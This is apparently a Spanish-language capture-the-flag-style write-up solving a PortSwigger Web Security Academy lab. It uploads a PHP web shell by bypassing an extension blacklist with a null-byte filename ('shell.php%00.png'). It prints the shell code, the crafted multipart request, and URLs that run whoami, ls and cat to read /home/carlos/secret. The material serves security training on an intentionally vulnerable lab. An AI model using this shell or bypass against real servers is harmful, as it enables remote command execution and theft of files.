---
title: File Upload Vulnerabilities Lab 5
date: 2024-11-25 12:26:00 +0800
lang: es-ES
author: Justice-Reaper
categories:
  - Portswigger
  - File Upload Vulnerabilities
tags:
  - File Upload Vulnerabilities
  - Web shell upload via obfuscated file extension
image:
  path: /assets/img/File-Upload-Vulnerabilities-Lab-5/Portswigger.png
---

## Skills

- Web shell upload via obfuscated file extension

## Certificaciones

- eWPT
- eWPTXv2
- OSWE
- BSCP
  
## Descripción

Este `laboratorio` contiene una `función` de carga de imágenes `vulnerable`, ciertas `extensiones` de `archivo` están `blacklisteadas`, pero esta defensa puede ser `eludida` usando una `clásica técnica` de `ofuscación`. Para resolver el laboratorio, debemos subir una web shell básica en `PHP`, utilizarla para `extraer` el `contenido` del archivo `/home/carlos/secret` y enviar este secreto utilizando el botón proporcionado en la barra del laboratorio. Podemos `iniciar sesión` con nuestra propia cuenta utilizando las siguientes credenciales: `wiener:peter`

---

## Resolución

Al `acceder` a la `web` nos sale esto

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_1.png)

Pulsamos en `My account` e `iniciamos sesión` con las credenciales `wiener:peter`

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_2.png)

Vemos que existe un `campo` de `subida` de `archivos`

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_3.png)

Si `inspeccionamos` con `donde` se `aloja` la `imagen` vemos que es en la ruta `/resources/images`

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_4.png)

Nos creamos un archivo llamado `shell.php` y lo `subimos`

```
<?php
    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
?>
```

Al subir el archivo nos sale un error

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_5.png)

Subimos el archivo nuevamente y capturamos la petición con Burpsuite, el payload va a ser `shell.php%00.png`, las versiones de php inferiores a la 5.4 son vulnerables a null byte injection `%00`, lo que hace que ignore lo que hay detrás de él y no se interprete

```
Content-Disposition: form-data; name="avatar"; filename="shell.php%00.png"
Content-Type: application/x-php

<?php
    echo "<pre>" . system($_REQUEST['cmd']) . "</pre>";
?>
```

Vemos que el archivo php se ha subido correctamente y que seha subido con el nombre shell.php ignorando lo que hay detrás del null byte `%00`

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_6.png)

Abrimos nuevamente el `inspector` de `chrome` y vemos que el archivo subido se aloja en `/files/avatars`

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_7.png)

Si accedemos a `https://0a8000880480dca9801485ed00820059.web-security-academy.net/files/avatars/shell.php%00.png?cmd=whoami` vemos que nos da un error

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_8.png)

Sin embargo, sin accedemos a `https://0a8000880480dca9801485ed00820059.web-security-academy.net/files/avatars/shell.php?cmd=whoami` vemos que nos ejecuta el comando

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_9.png)

`Listamos` el `contenido` de la `home` de carlos `https://0a8000880480dca9801485ed00820059.web-security-academy.net/files/avatars/shell.php?cmd=ls%20/home/carlos`

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_10.png)

Obtenemos el contenido del archivo secret `https://0a8000880480dca9801485ed00820059.web-security-academy.net/files/avatars/shell.php?cmd=cat%20/home/carlos/secret`

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_11.png)

`Submiteamos` la `solución`

![](/assets/img/File-Upload-Vulnerabilities-Lab-5/image_12.png)
